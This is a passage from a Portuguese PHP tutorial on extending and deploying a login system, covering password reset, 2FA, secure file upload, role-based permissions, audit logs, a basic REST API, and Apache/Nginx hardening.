✅ Proteção de páginas restritas (requireLogin)
✅ HTTPS em produção (secure=true)

⚠️ Pendente (melhorias):
□ Rate limiting
□ Recuperação de senha
□ Verificação de email
□ 2FA (autenticação de dois fatores)
□ CAPTCHA
□ Timeout de sessão automático
________________________________________
12. Expandindo o Sistema
12.1 Recuperação de Senha
Tabela adicional:
CREATE TABLE tokens_reset (
    id INT AUTO_INCREMENT PRIMARY KEY,
    usuario_id INT NOT NULL,
    token VARCHAR(64) NOT NULL,
    expira_em TIMESTAMP NOT NULL,
    usado TINYINT(1) DEFAULT 0,
    FOREIGN KEY (usuario_id) REFERENCES usuarios(id),
    INDEX idx_token (token),
    INDEX idx_expira (expira_em)
);
Fluxo:
1.	Usuário solicita reset
2.	Sistema gera token único
3.	Envia email com link: reset.php?token=abc123
4.	Token válido por 1 hora
5.	Usuário define nova senha
6.	Token marcado como usado
12.2 Verificação de Email
Campo adicional:
ALTER TABLE usuarios ADD COLUMN email_verificado TINYINT(1) DEFAULT 0;
Processo:
1.	Após cadastro, enviar email com token
2.	Usuário clica no link
3.	Sistema valida token e marca email
12.3 Autenticação de Dois Fatores (2FA)
Tabela adicional:
CREATE TABLE two_factor (
    id INT AUTO_INCREMENT PRIMARY KEY,
    usuario_id INT NOT NULL UNIQUE,
    secret VARCHAR(32) NOT NULL,
    ativo TINYINT(1) DEFAULT 0,
    criado_em TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (usuario_id) REFERENCES usuarios(id) ON DELETE CASCADE
);
Implementação com TOTP:
// Usar biblioteca: https://github.com/PHPGangsta/GoogleAuthenticator

// Gerar secret ao ativar 2FA
$ga = new PHPGangsta_GoogleAuthenticator();
$secret = $ga->createSecret();

// Gerar QR Code
$qrCodeUrl = $ga->getQRCodeGoogleUrl('SistemaLogin', $secret);

// Validar código
$valid = $ga->verifyCode($secret, $code, 2);

**Fluxo de login com 2FA:**
1. Usuário digita email/senha
   ↓
2. Credenciais validadas
   ↓
3. Sistema verifica se 2FA está ativo
   ↓
4. Redireciona para página de código
   ↓
5. Usuário insere código do app (Google Authenticator)
   ↓
6. Sistema valida código
   ↓
7. Login completo
12.4 Upload de Foto de Perfil
Estrutura:
ALTER TABLE usuarios ADD COLUMN foto_perfil VARCHAR(255) NULL;
// UserController.php - Upload seguro
function handleUploadFoto($pdo) {
    if (!isLoggedIn()) die("Não autorizado");
    
    $user_id = $_SESSION['user_id'];
    $arquivo = $_FILES['foto'] ?? null;
    
    if (!$arquivo || $arquivo['error'] !== UPLOAD_ERR_OK) {
        Session::setFlash('error', 'Erro ao fazer upload');
        header('Location: ../../public/dashboard.php');
        exit();
    }
    
    // Validações
    $extensoesPermitidas = ['jpg', 'jpeg', 'png', 'gif'];
    $tamanhoMaximo = 2 * 1024 * 1024; // 2MB
    
    $extensao = strtolower(pathinfo($arquivo['name'], PATHINFO_EXTENSION));
    $tamanho = $arquivo['size'];
    
    if (!in_array($extensao, $extensoesPermitidas)) {
        Session::setFlash('error', 'Formato inválido. Use JPG, PNG ou GIF');
        header('Location: ../../public/dashboard.php');
        exit();
    }
    
    if ($tamanho > $tamanhoMaximo) {
        Session::setFlash('error', 'Arquivo muito grande. Máximo 2MB');
        header('Location: ../../public/dashboard.php');
        exit();
    }
    
    // Validar tipo MIME real (não confiar na extensão)
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $arquivo['tmp_name']);
    finfo_close($finfo);
    
    $mimePermitidos = ['image/jpeg', 'image/png', 'image/gif'];
    if (!in_array($mimeType, $mimePermitidos)) {
        Session::setFlash('error', 'Arquivo não é uma imagem válida');
        header('Location: ../../public/dashboard.php');
        exit();
    }
    
    // Gerar nome único
    $nomeArquivo = uniqid() . '_' . $user_id . '.' . $extensao;
    $diretorio = '../../uploads/fotos/';
    
    // Criar diretório se não existir
    if (!is_dir($diretorio)) {
        mkdir($diretorio, 0755, true);
    }
    
    $caminhoCompleto = $diretorio . $nomeArquivo;
    
    // Mover arquivo
    if (move_uploaded_file($arquivo['tmp_name'], $caminhoCompleto)) {
        // Deletar foto antiga
        $sql = "SELECT foto_perfil FROM usuarios WHERE id = ?";
        $stmt = $pdo->prepare($sql);
        $stmt->execute([$user_id]);
        $fotoAntiga = $stmt->fetchColumn();
        
        if ($fotoAntiga && file_exists($diretorio . $fotoAntiga)) {
            unlink($diretorio . $fotoAntiga);
        }
        
        // Atualizar banco
        $sql = "UPDATE usuarios SET foto_perfil = ? WHERE id = ?";
        $stmt = $pdo->prepare($sql);
        $stmt->execute([$nomeArquivo, $user_id]);
        
        Session::setFlash('success', 'Foto atualizada com sucesso!');
    } else {
        Session::setFlash('error', 'Erro ao salvar arquivo');
    }
    
    header('Location: ../../public/dashboard.php');
    exit();
}
Formulário no dashboard:
<form method="POST" action="../src/controllers/UserController.php?action=upload_foto" 
      enctype="multipart/form-data" class="form">
    <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
    
    <?php if ($usuario['foto_perfil']): ?>
        <img src="../uploads/fotos/<?php echo htmlspecialchars($usuario['foto_perfil']); ?>" 
             alt="Foto" style="width: 150px; border-radius: 50%;">
    <?php endif; ?>
    
    <div class="form-group">
        <label for="foto">Foto de Perfil:</label>
        <input type="file" id="foto" name="foto" accept="image/*" required>
        <small>Formatos: JPG, PNG, GIF. Máximo: 2MB</small>
    </div>
    
    <button type="submit" class="btn btn-primary">Enviar Foto</button>
</form>
Segurança no upload:
1.	Validar extensão (whitelist)
2.	Validar tipo MIME real
3.	Limitar tamanho
4.	Gerar nome único (evita sobrescrever)
5.	Armazenar fora do webroot (ou proteger diretório)
6.	Nunca confiar no nome original
12.5 Sistema de Permissões (RBAC)
Role-Based Access Control
Tabelas adicionais:
-- Tabela de roles (papéis)
CREATE TABLE roles (
    id INT AUTO_INCREMENT PRIMARY KEY,
    nome VARCHAR(50) UNIQUE NOT NULL,
    descricao VARCHAR(255)
);

-- Tabela de permissões
CREATE TABLE permissoes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    nome VARCHAR(50) UNIQUE NOT NULL,
    descricao VARCHAR(255)
);

-- Relacionamento role-permissões
CREATE TABLE role_permissoes (
    role_id INT,
    permissao_id INT,
    PRIMARY KEY (role_id, permissao_id),
    FOREIGN KEY (role_id) REFERENCES roles(id) ON DELETE CASCADE,
    FOREIGN KEY (permissao_id) REFERENCES permissoes(id) ON DELETE CASCADE
);

-- Adicionar role ao usuário
ALTER TABLE usuarios ADD COLUMN role_id INT DEFAULT 1;
ALTER TABLE usuarios ADD FOREIGN KEY (role_id) REFERENCES roles(id);

-- Dados iniciais
INSERT INTO roles (nome, descricao) VALUES 
('user', 'Usuário comum'),
('admin', 'Administrador'),
('moderator', 'Moderador');

INSERT INTO permissoes (nome, descricao) VALUES 
('view_dashboard', 'Ver dashboard'),
('edit_profile', 'Editar perfil'),
('manage_users', 'Gerenciar usuários'),
('view_logs', 'Ver logs do sistema');

INSERT INTO role_permissoes (role_id, permissao_id) VALUES 
(1, 1), (1, 2),  -- user: ver dashboard, editar perfil
(2, 1), (2, 2), (2, 3), (2, 4),  -- admin: todas
(3, 1), (3, 2), (3, 4);  -- moderator: ver dashboard, editar perfil, ver logs
Classe de autorização:
<?php
// src/utils/Authorization.php

class Authorization {
    private $pdo;
    
    public function __construct($pdo) {
        $this->pdo = $pdo;
    }
    
    /**
     * Verifica se usuário tem permissão
     */
    public function userCan($user_id, $permissao) {
        $sql = "SELECT COUNT(*) FROM role_permissoes rp
                INNER JOIN permissoes p ON rp.permissao_id = p.id
                INNER JOIN usuarios u ON u.role_id = rp.role_id
                WHERE u.id = ? AND p.nome = ?";
        
        $stmt = $this->pdo->prepare($sql);
        $stmt->execute([$user_id, $permissao]);
        
        return $stmt->fetchColumn() > 0;
    }
    
    /**
     * Verifica se usuário tem role
     */
    public function userHasRole($user_id, $role_nome) {
        $sql = "SELECT r.nome FROM usuarios u
                INNER JOIN roles r ON u.role_id = r.id
                WHERE u.id = ?";
        
        $stmt = $this->pdo->prepare($sql);
        $stmt->execute([$user_id]);
        
        return $stmt->fetchColumn() === $role_nome;
    }
    
    /**
     * Requer permissão (redireciona se não tiver)
     */
    public function requirePermission($user_id, $permissao) {
        if (!$this->userCan($user_id, $permissao)) {
            Session::setFlash('error', 'Você não tem permissão para acessar esta página');
            header('Location: ../public/dashboard.php');
            exit();
        }
    }
}
?>
Uso prático:
// admin.php - Página administrativa
<?php
require_once '../src/config/config.php';
require_once '../src/utils/Authorization.php';

requireLogin();

$auth = new Authorization($pdo);
$auth->requirePermission($_SESSION['user_id'], 'manage_users');

// Apenas usuários com permissão chegam aqui
?>
// Dashboard condicional
<?php if ($auth->userCan($_SESSION['user_id'], 'view_logs')): ?>
    <div class="info-card">
        <h3>📋 Logs do Sistema</h3>
        <!-- Conteúdo apenas para quem pode ver logs -->
    </div>
<?php endif; ?>
12.6 Histórico de Alterações
Tabela de auditoria:
CREATE TABLE auditoria (
    id INT AUTO_INCREMENT PRIMARY KEY,
    usuario_id INT NOT NULL,
    tabela VARCHAR(50) NOT NULL,
    registro_id INT NOT NULL,
    acao ENUM('INSERT', 'UPDATE', 'DELETE') NOT NULL,
    dados_anteriores TEXT,
    dados_novos TEXT,
    data_hora TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ip_address VARCHAR(45),
    FOREIGN KEY (usuario_id) REFERENCES usuarios(id),
    INDEX idx_tabela_registro (tabela, registro_id),
    INDEX idx_data (data_hora)
);
Classe de auditoria:
<?php
// src/utils/Audit.php

class Audit {
    private $pdo;
    
    public function __construct($pdo) {
        $this->pdo = $pdo;
    }
    
    /**
     * Registra alteração
     */
    public function log($user_id, $tabela, $registro_id, $acao, $dados_anteriores = null, $dados_novos = null) {
        $sql = "INSERT INTO auditoria (usuario_id, tabela, registro_id, acao, dados_anteriores, dados_novos, ip_address)
                VALUES (?, ?, ?, ?, ?, ?, ?)";
        
        $stmt = $this->pdo->prepare($sql);
        $stmt->execute([
            $user_id,
            $tabela,
            $registro_id,
            $acao,
            $dados_anteriores ? json_encode($dados_anteriores) : null,
            $dados_novos ? json_encode($dados_novos) : null,
            $_SERVER['REMOTE_ADDR']
        ]);
    }
    
    /**
     * Busca histórico de um registro
     */
    public function getHistory($tabela, $registro_id) {
        $sql = "SELECT a.*, u.nome as usuario_nome 
                FROM auditoria a
                INNER JOIN usuarios u ON a.usuario_id = u.id
                WHERE a.tabela = ? AND a.registro_id = ?
                ORDER BY a.data_hora DESC";
        
        $stmt = $this->pdo->prepare($sql);
        $stmt->execute([$tabela, $registro_id]);
        
        return $stmt->fetchAll();
    }
}
?>
Integração com UserController:
// Ao atualizar perfil
$audit = new Audit($pdo);

// Buscar dados anteriores
$dadosAntigos = $userModel->findById($user_id);

// Atualizar
$sql = "UPDATE usuarios SET nome = ? WHERE id = ?";
$stmt = $pdo->prepare($sql);
$stmt->execute([$nome, $user_id]);

// Registrar auditoria
$audit->log(
    $user_id,
    'usuarios',
    $user_id,
    'UPDATE',
    ['nome' => $dadosAntigos['nome']],
    ['nome' => $nome]
);
12.7 API RESTful
Estrutura de endpoints:
<?php
// src/api/v1/index.php

require_once '../../config/config.php';

// Headers para API
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *'); // Configurar domínios permitidos
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

// Capturar método e endpoint
$method = $_SERVER['REQUEST_METHOD'];
$endpoint = $_GET['endpoint'] ?? '';

// Autenticação via token JWT (exemplo simplificado)
function authenticate() {
    $headers = getallheaders();
    $token = $headers['Authorization'] ?? '';
    
    if (!$token) {
        http_response_code(401);
        echo json_encode(['error' => 'Token não fornecido']);
        exit();
    }
    
    // Validar token (implementar JWT)
    // return $user_id;
}

// Router simples
switch ($endpoint) {
    case 'users':
        switch ($method) {
            case 'GET':
                // Listar usuários
                $user_id = authenticate();
                // ... código
                break;
            
            case 'POST':
                // Criar usuário
                $data = json_decode(file_get_contents('php://input'), true);
                // ... código
                break;
            
            case 'PUT':
                // Atualizar usuário
                break;
            
            case 'DELETE':
                // Deletar usuário
                break;
        }
        break;
    
    case 'login':
        if ($method === 'POST') {
            $data = json_decode(file_get_contents('php://input'), true);
            
            $email = $data['email'] ?? '';
            $senha = $data['senha'] ?? '';
            
            // Validar credenciais
            $userModel = new User($pdo);
            $usuario = $userModel->findByEmail($email);
            
            if ($usuario && password_verify($senha, $usuario['senha_hash'])) {
                // Gerar token JWT
                $token = gerarTokenJWT($usuario['id']);
                
                echo json_encode([
                    'success' => true,
                    'token' => $token,
                    'user' => [
                        'id' => $usuario['id'],
                        'nome' => $usuario['nome'],
                        'email' => $usuario['email']
                    ]
                ]);
            } else {
                http_response_code(401);
                echo json_encode(['error' => 'Credenciais inválidas']);
            }
        }
        break;
    
    default:
        http_response_code(404);
        echo json_encode(['error' => 'Endpoint não encontrado']);
}
?>
Exemplo de requisição:
// Login via API
fetch('http://localhost/sistemalogin/src/api/v1/?endpoint=login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        email: 'exemplo@email.com',
        senha: '12345678'
    })
})
.then(res => res.json())
.then(data => {
    console.log('Token:', data.token);
    localStorage.setItem('token', data.token);
});

// Listar usuários (autenticado)
fetch('http://localhost/sistemalogin/src/api/v1/?endpoint=users', {
    method: 'GET',
    headers: {
        'Authorization': 'Bearer ' + localStorage.getItem('token')
    }
})
.then(res => res.json())
.then(data => console.log(data));
________________________________________
13. Otimizações e Boas Práticas
13.1 Caching de Sessão
Usar Redis para sessões:
// config.php
ini_set('session.save_handler', 'redis');
ini_set('session.save_path', 'tcp://127.0.0.1:6379');
Benefícios:
•	Mais rápido que arquivos
•	Escalável (múltiplos servidores)
•	Timeout automático
13.2 Prepared Statements Reutilizáveis
// Modelo otimizado
class User {
    private $pdo;
    private $stmtFindByEmail;
    
    public function __construct($pdo) {
        $this->pdo = $pdo;
        
        // Preparar statements uma vez
        $this->stmtFindByEmail = $pdo->prepare(
            "SELECT id, nome, email, senha_hash, ativo 
             FROM usuarios WHERE email = ?"
        );
    }
    
    public function findByEmail($email) {
        $this->stmtFindByEmail->execute([$email]);
        return $this->stmtFindByEmail->fetch();
    }
}
13.3 Autoload de Classes
Usar spl_autoload_register:
// config.php
spl_autoload_register(function($class) {
    $paths = [
        __DIR__ . '/../models/',
        __DIR__ . '/../utils/',
        __DIR__ . '/../controllers/'
    ];
    
    foreach ($paths as $path) {
        $file = $path . $class . '.php';
        if (file_exists($file)) {
            require_once $file;
            return;
        }
    }
});

// Agora não precisa de require_once manual
$user = new User($pdo); // Carrega automaticamente
13.4 Variáveis de Ambiente
Usar arquivo .env:
# .env (na raiz do projeto)
DB_HOST=localhost
DB_USER=root
DB_PASS=
DB_NAME=sistema_login
ENVIRONMENT=production
// Carregar com vlucas/phpdotenv
require_once 'vendor/autoload.php';

$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->load();

$host = $_ENV['DB_HOST'];
$usuario = $_ENV['DB_USER'];
$senha = $_ENV['DB_PASS'];
$banco = $_ENV['DB_NAME'];

**Adicionar ao .gitignore:**
.env
vendor/
13.5 Logs Estruturados
Usar Monolog:
use Monolog\Logger;
use Monolog\Handler\StreamHandler;

$log = new Logger('sistema');
$log->pushHandler(new StreamHandler(__DIR__ . '/logs/app.log', Logger::WARNING));

// Uso
$log->info('Usuário logou', ['user_id' => 1]);
$log->warning('Tentativa de login falhou', ['email' => 'teste@email.com']);
$log->error('Erro no banco', ['exception' => $e->getMessage()]);
13.6 Testes Automatizados
PHPUnit básico:
// tests/UserTest.php
use PHPUnit\Framework\TestCase;

class UserTest extends TestCase {
    private $pdo;
    private $user;
    
    protected function setUp(): void {
        // Banco de testes
        $this->pdo = new PDO('mysql:host=localhost;dbname=sistema_login_test', 'root', '');
        $this->user = new User($this->pdo);
    }
    
    public function testCreateUser() {
        $nome = 'Teste';
        $email = 'teste@test.com';
        $hash = password_hash('12345678', PASSWORD_DEFAULT);
        
        $result = $this->user->create($nome, $email, $hash);
        
        $this->assertTrue($result);
    }
    
    public function testEmailExists() {
        $this->assertTrue($this->user->emailExists('exemplo@email.com'));
        $this->assertFalse($this->user->emailExists('naoexiste@email.com'));
    }
    
    protected function tearDown(): void {
        // Limpar banco de testes
    }
}
## 14. Deploy em Produção
### 14.1 Checklist de Segurança
✅ HTTPS obrigatório (certificado SSL)
✅ secure=true nas sessões
✅ ENVIRONMENT='production'
✅ display_errors=Off
✅ log_errors=On
✅ Credenciais em .env (fora do repositório)
✅ Backups automáticos do banco
✅ Firewall configurado
✅ Rate limiting implementado
✅ Monitoramento de logs
✅ Atualizações de segurança do PHP/MySQL
14.2 Configuração do Servidor
Apache (.htaccess):
# Bloquear acesso a arquivos sensíveis
<FilesMatch "\.(env|sql|log|md)$">
    Order allow,deny
    Deny from all
</FilesMatch>

# Forçar HTTPS
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]

# Proteger diretórios
Options -Indexes

# Headers de segurança
Header set X-Frame-Options "SAMEORIGIN"
Header set X-Content-Type-Options "nosniff"
Header set X-XSS-Protection "1; mode=block"
Header set Referrer-Policy "strict-origin-when-cross-origin"
Nginx:
server {
    listen 443 ssl http2;
    server_name seusite.com;
    
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    root /var/www/sistemalogin/public;
    index index.php;
    
    # Bloquear arquivos sensíveis
    location ~ /\.(env|git|sql) {
        deny all;
    }
    
    # PHP-FPM
    location ~ \.php$ {
        fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
        fastcgi_index index.php;
        include fastcgi_params;
    }
    
    # Headers de segurança
    add_header X-Frame-Options "SAMEORIGIN";
    add_header X-Content-Type-Options "nosniff";
    add_header X-XSS-Protection "1; mode=block";
}
14.3 Monitoramento
Script de monitoramento:
// monitor.php (protegido por senha)
<?php
// Verificar espaço em disco
$disk_free = disk_free_space('/');
$disk_total = disk_total_space('/');
$disk_used_percent = (1 - ($disk_free / $disk_total)) * 100;

// Verificar banco de dados
try {
    $pdo = new PDO(...);
    $db_status = 'OK';
} catch (Exception $e) {
    $db_status = 'ERRO: ' . $e->getMessage();
}

// Verificar logs recentes
$error_log = file_get_contents('/var/log/php_errors.log');
$recent_errors = substr_count($error_log, '[' . date('Y-m-d') . ']');

echo json_encode([
    'timestamp' => time(),
    'disk_used' => round($disk_used_percent, 2) . '%',
    'database' => $db_status,
    'errors_today' => $recent_errors
]);
?>
________________________________________
15. Conclusão
15.1 Resumo do Aprendizado
Nesta apostila, você aprendeu:
1.	Arquitetura MVC adaptada para PHP puro
2.	Segurança em múltiplas camadas: 
o	SQL Injection (Prepared Statements)
o	XSS (htmlspecialchars)
o	CSRF (Tokens únicos)
o	Session Hijacking (Cookies seguros)
3.	Criptografia de senhas com Bcrypt
4.	Sistema de autenticação completo
5.	Auditoria e logs de segurança
6.	Boas práticas de desenvolvimento
15.2 Próximos Passos
1.	Implementar melhorias sugeridas: 
o	Rate limiting
o	Recuperação de senha
o	2FA
o	Upload de arquivos
2.	Estudar frameworks: 
o	Laravel (PHP)
o	Symfony (PHP)
o	Node.js + Express
3.	Aprofundar em segurança: 
o	OWASP Top 10
o	Testes de penetração
o	Bug bounty
15.3 Recursos Adicionais
Documentação oficial:
•	PHP: https://www.php.net/manual/pt_BR/
•	MySQL: https://dev.mysql.com/doc/
•	PDO: https://www.php.net/manual/pt_BR/book.pdo.php
Segurança:
•	OWASP: https://owasp.org/
•	PHP Security Cheat Sheet: https://cheatsheetseries.owasp.org/
Comunidade:
•	Stack Overflow: https://stackoverflow.com/
•	Reddit r/PHP: https://reddit.com/r/PHP/
•	PHP Brasil (Telegram/Discord)
________________________________________
16. Glossário
Termo	            Definição
Bcrypt	            Algoritmo de hash para senhas, lento por design
CSRF	            Cross-Site Request Forgery (falsificação de requisição)
Hash	            Função unidirecional que transforma texto em código fixo
HttpOnly	        Atributo de cookie que impede acesso via JavaScript
MVC	                Model-View-Controller (padrão arquitetural)
PDO	                PHP Data Objects (camada de abstração de banco)
Prepared Statement	Query SQL pré-compilada com parâmetros
Salt	            Dado aleatório adicionado ao hash para unicidade
Sanitização	        Limpeza de dados de entrada
Session Hijacking	Roubo de sessão de usuário
SQL Injection	    Injeção de código SQL malicioso
XSS	                Cross-Site Scripting (injeção de JavaScript)